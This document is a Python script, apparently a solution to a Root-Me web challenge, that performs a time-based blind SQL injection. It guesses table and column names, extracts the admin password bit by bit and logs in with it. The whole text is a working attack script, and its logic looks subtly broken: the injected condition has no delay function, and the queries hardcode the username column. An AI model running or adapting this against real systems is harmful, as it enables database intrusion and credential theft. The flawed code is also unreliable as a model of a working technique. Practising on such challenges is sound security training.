import requests
import time
import sys

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

# Umbral de tiempo (basado en la prueba que funcionó)
UMBRAL = 2.0  # Si tarda más de 2 segundos, la condición es TRUE

def is_true(payload):
    """Ejecuta la inyección en el parámetro action y retorna True si hay retardo"""
    # Construimos el payload completo
    full_payload = f"login'/**/AND/**/{payload}/**/-- -"
    
    params = {"action": full_payload}
    
    try:
        inicio = time.time()
        r = requests.get(URL, params=params, cookies=COOKIE, timeout=30)
        tiempo = time.time() - inicio
        # print(f"  [DEBUG] Tiempo: {tiempo:.2f}s - {payload[:50]}")
        return tiempo > UMBRAL
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False

def extract_data(query):
    """Extrae datos usando la inyección"""
    # Construimos la consulta
    payload = f"EXISTS({query})"
    
    # Probamos si la consulta devuelve resultados
    if is_true(payload):
        return True
    return False

def get_table_name():
    """Obtiene el nombre de la tabla que contiene los usuarios"""
    print("[*] Buscando tabla de usuarios...")
    
    # Lista de posibles nombres de tabla
    tablas = ['users', 'usuarios', 'member', 'members', 'admin', 'administradores', 'user']
    
    for tabla in tablas:
        print(f"  Probando: {tabla}")
        query = f"SELECT * FROM {tabla} WHERE 1=1"
        if extract_data(query):
            print(f"[+] ¡Tabla encontrada! -> {tabla}")
            return tabla
        time.sleep(0.5)
    
    return None

def get_column_names(tabla):
    """Obtiene los nombres de las columnas de usuario y contraseña"""
    print(f"[*] Buscando columnas en {tabla}...")
    
    columnas_user = ['username', 'user', 'login', 'name', 'admin', 'usuario']
    columnas_pass = ['password', 'pass', 'clave', 'pwd', 'contrasena']
    
    col_user = None
    col_pass = None
    
    # Buscar columna de usuario
    for col in columnas_user:
        print(f"  Probando columna usuario: {col}")
        query = f"SELECT {col} FROM {tabla} WHERE 1=1"
        if extract_data(query):
            print(f"[+] Columna de usuario encontrada: {col}")
            col_user = col
            break
        time.sleep(0.5)
    
    # Buscar columna de contraseña
    for col in columnas_pass:
        print(f"  Probando columna contraseña: {col}")
        query = f"SELECT {col} FROM {tabla} WHERE 1=1"
        if extract_data(query):
            print(f"[+] Columna de contraseña encontrada: {col}")
            col_pass = col
            break
        time.sleep(0.5)
    
    return col_user, col_pass

def get_password_length(tabla, col_pass):
    """Obtiene la longitud de la contraseña del admin"""
    print("[*] Obteniendo longitud de la contraseña...")
    
    for i in range(1, 50):
        query = f"SELECT {col_pass} FROM {tabla} WHERE LENGTH({col_pass}) = {i} AND username = 'admin'"
        print(f"  Probando longitud: {i}")
        if extract_data(query):
            print(f"[+] Longitud: {i}")
            return i
        time.sleep(0.3)
    
    return None

def extract_char_bit(tabla, col_pass, pos):
    """Extrae un carácter usando método bit a bit"""
    valor = 0
    for bit in range(8):
        potencia = 2 ** bit
        query = f"SELECT {col_pass} FROM {tabla} WHERE username = 'admin' AND ASCII(SUBSTRING({col_pass}, {pos}, 1)) & {potencia}"
        if extract_data(query):
            valor |= potencia
        time.sleep(0.2)
    return chr(valor)

def main():
    print("="*70)
    print("  TIME-BASED SQL INJECTION - ROOT-ME CH40")
    print("  Recuperando contraseña del admin")
    print("="*70)
    
    # Paso 1: Encontrar la tabla
    tabla = get_table_name()
    if not tabla:
        print("[-] No se encontró la tabla. Saliendo...")
        sys.exit(1)
    
    # Paso 2: Encontrar las columnas
    col_user, col_pass = get_column_names(tabla)
    if not col_user or not col_pass:
        print("[-] No se encontraron las columnas. Saliendo...")
        sys.exit(1)
    
    print(f"\n[+] Tabla: {tabla}")
    print(f"[+] Columna usuario: {col_user}")
    print(f"[+] Columna contraseña: {col_pass}")
    
    # Paso 3: Obtener longitud de la contraseña
    longitud = get_password_length(tabla, col_pass)
    if not longitud:
        print("[-] No se pudo obtener la longitud. Saliendo...")
        sys.exit(1)
    
    # Paso 4: Extraer la contraseña
    print(f"\n[*] Extrayendo contraseña de {longitud} caracteres...")
    password = ""
    
    for pos in range(1, longitud + 1):
        print(f"\n  [*] Posición {pos}/{longitud}...")
        char = extract_char_bit(tabla, col_pass, pos)
        password += char
        print(f"  [+] Carácter: '{char}' (ASCII: {ord(char)})")
        print(f"  [*] Progreso: {password}")
    
    print("\n" + "="*70)
    print(f"[+] ¡CONTRASEÑA ENCONTRADA!: {password}")
    print("="*70)
    
    # Verificar la contraseña
    print("\n[*] Verificando credenciales...")
    login_data = {
        "username": "admin",
        "password": password
    }
    try:
        r = requests.post(f"{URL}?action=login", data=login_data, cookies=COOKIE)
        if "Authentification error" not in r.text:
            print("[+] ¡Credenciales correctas!")
            print(f"[+] Usuario: admin")
            print(f"[+] Contraseña: {password}")
        else:
            print("[-] Las credenciales no funcionan. Revisando...")
    except Exception as e:
        print(f"[ERROR] {e}")

if __name__ == "__main__":
    main()
